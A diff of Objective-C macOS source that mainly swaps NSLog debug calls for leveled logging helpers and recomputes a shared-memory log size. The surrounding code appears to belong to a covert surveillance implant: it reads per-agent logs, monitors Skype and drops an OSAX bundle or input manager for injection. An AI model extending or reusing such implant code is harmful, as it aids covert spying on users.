@@ -684,7 +684,7 @@ static void computerWillShutdown(CFMachPortRef port,
           shMemLog = (shMemoryLog *)[readData bytes];
           
 #ifdef DEBUG_CORE         
-          NSLog(@"%s: Logging shMemLog->agentID = 0x%x", __FUNCTION__, shMemLog->agentID);
+          verboseLog(@"Logging shMemLog->agentID = 0x%x", shMemLog->agentID);
 #endif          
           switch (shMemLog->agentID)
             {
@@ -735,12 +735,11 @@ static void computerWillShutdown(CFMachPortRef port,
                                       withLogID: 0] == TRUE)
                 {
 #ifdef DEBUG_CORE
-                  NSLog(@"%s: Log header agentID %x, status %x command size %d", 
-                          __FUNCTION__,
+                  infoLog(@"Log header agentID %x, status %x command size %d", 
                           shMemLog->agentID, 
                           shMemLog->status,
                           shMemLog->commandDataSize);
-                  NSLog(@"%s: header data size %lu", __FUNCTION__, sizeof(shMemoryLog));
+                  verboseLog(@"header data size %lu", sizeof(shMemoryLog));
 #endif
                 }
                 
@@ -1223,7 +1222,7 @@ static void computerWillShutdown(CFMachPortRef port,
       
 #ifdef DEBUG_CORE
       if (x == 0)
-        verboseLog(@"Checking if skype is running");
+        infoLog(@"Checking if skype is running");
 #endif
 
       if (agentConfiguration != nil)
@@ -1232,7 +1231,7 @@ static void computerWillShutdown(CFMachPortRef port,
           
 #ifdef DEBUG_CORE
           if (x == 0)
-            verboseLog(@"Got skype conf");
+            infoLog(@"Got skype conf");
 #endif
           
           if ([agentConfiguration objectForKey: @"status"]    == AGENT_RUNNING
@@ -1254,6 +1253,13 @@ static void computerWillShutdown(CFMachPortRef port,
             }
           
           [agentConfiguration release];
+        }
+      else
+        {
+#ifdef DEBUG_CORE
+          if (x == 0)
+            warnLog(@"Skype conf not found");
+#endif
         }
         
 #ifdef DEBUG_CORE
@@ -1552,7 +1558,7 @@ static void computerWillShutdown(CFMachPortRef port,
       // Give a smaller size since we don't have privileges
       // for executing sysctl
       //
-      gMemLogMaxSize = 0x7a440;
+      gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MIN_NUM_BLOCKS;
     }
 }
 
@@ -2320,6 +2326,12 @@ static void computerWillShutdown(CFMachPortRef port,
   NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
   BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
 
+  //
+  // First of all, calculate properly the shared memory size
+  // for logs
+  //
+  gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
+
   // Get OS version
   [[NSApplication sharedApplication] getSystemVersionMajor: &gOSMajor
                                                      minor: &gOSMinor
@@ -2521,9 +2533,19 @@ static void computerWillShutdown(CFMachPortRef port,
           // we need to create the fs hierarchy for the input manager and kext
           //
           if (gOSMajor == 10 && gOSMinor == 6)
-            [self _dropOsaxBundle];
+            {
+#ifdef DEBUG_CORE
+              infoLog(@"Dropping OSAX");
+#endif
+              [self _dropOsaxBundle];
+            }
           else if (gOSMajor == 10 && gOSMinor == 5)
-            [self _dropInputManager];
+            {
+#ifdef DEBUG_CORE
+              infoLog(@"Dropping input manager");
+#endif
+              [self _dropInputManager];
+            }
         }
     }
   
